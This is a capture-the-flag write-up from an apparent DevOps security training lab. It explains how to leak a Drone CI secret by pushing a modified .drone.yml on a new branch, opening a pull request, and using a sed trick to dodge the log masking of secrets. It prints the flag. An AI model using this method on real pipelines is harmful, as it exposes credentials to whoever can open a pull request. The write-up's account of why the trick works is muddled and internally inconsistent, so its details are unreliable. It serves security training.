# Report

## Welcomd to Empowering_DevOps_Security - Training

Solution to the training pipeline.
```yaml
## ----  Step 1  ------
kind: pipeline
type: docker
name: pipeline-1
## ----  Step 2  ------
steps:
  - name: python-1
    image: registry.devops.eds/python:buster
    commands:
        - pip install -r requirements.txt
        - python app.py
## ----  Step 4  ------
  - name: docker-using-environmental
    image: registry.devops.eds/docker:1
    commands:
        - sleep 3
        - docker login https://registry.devops.eds -u $USERNAME -p $PASSWORD
    environment:
      USERNAME:
        from_secret: USERNAME
      PASSWORD:
        from_secret: PASSWORD
  - name:
    image: regsitry.devops.eds/python:buster
    commands:
      python flag.py $FLAG
    environment:
      FLAG:
        from_secret: FLAG
## ----  Step 3  ------
services:
  - name: python-server
    image: registry.devops.eds/python:buster
    commands:
      - python python_server.py
```

## Get my credentials! - Solution
- You should first login in Gitea at `https://full-enormous-crow.ngrok-free.app` using your credentials
- Go to the repository `allen-leonard/Abberus` and open the file `.drone.yml`
- The flag is stored into the variable `$PASSWORD`. To get it we need to trigger the pipeline and let a drone runner execute a script that prints it in output. Since done protects the direct printing of the secrets we will circunvent the problem by not printing the password by all the characters of the password followed by the char `a`. This can be done by running the bash command ```- echo $(echo $PASSWORD | sed 's/./&x/g' | sed 's/x//g')```
- Modify the `.drone.yml` as follows:

```yaml
kind: pipeline
type: docker
name: default
steps:
- name: backend
  image: python:buster
  commands:
  - pip install --upgrade setuptools
  - pip install --upgrade pip
  - make deps
- name: dockerPush
  image: docker:latest
  commands:
  - echo $(echo $PASSWORD | sed 's/./&w/g' | sed 's/w//g')
  environment:
    PASSWORD:
      from_secret: docker_password
    USERNAME:
      from_secret: docker_username
    when:
      branch:
      - mybranch
      event:
      - push
      - pull_request
```

The two changes are related to the command to execute (after the `commands` keyword) and the branch name.
- Save this as a new branch called mybranch
- To trigger to the pipeline you have to create a pull request to merge the new branch into main.
- This will trigger the building using the mybranch pipeline. Now, going into the drones at `https://drone.devops.eds` (possibly after autorizing it using the normal user credentials) you should see that a build has been trigger and if you open it at the dockerPush step you should see the password printed like `EaDaFa{atauatauarajagakajafa}a`
- The sed command needs to create a "new" string for it to be printed out in the terminal. Otherwise the drone runner will recognize the secret and hide it.
Therefore a command like this: `- echo $(echo $PASSWORD | sed 's/./&o/g' | sed 's/o//g')` will show ****** because there is no "o"'s in the flag string where 
`- echo $(echo $PASSWORD | sed 's/./&w/g' | sed 's/w//g')` will because there is a w in the flag string. Although if you the w's in the string you might also remove some you'll need for the flag.
### Flag: EDS{h1ding_b3h1nd_a_pUll_r3quest_wa7_n0t_3n0ugh}



## Peons will do what they are told.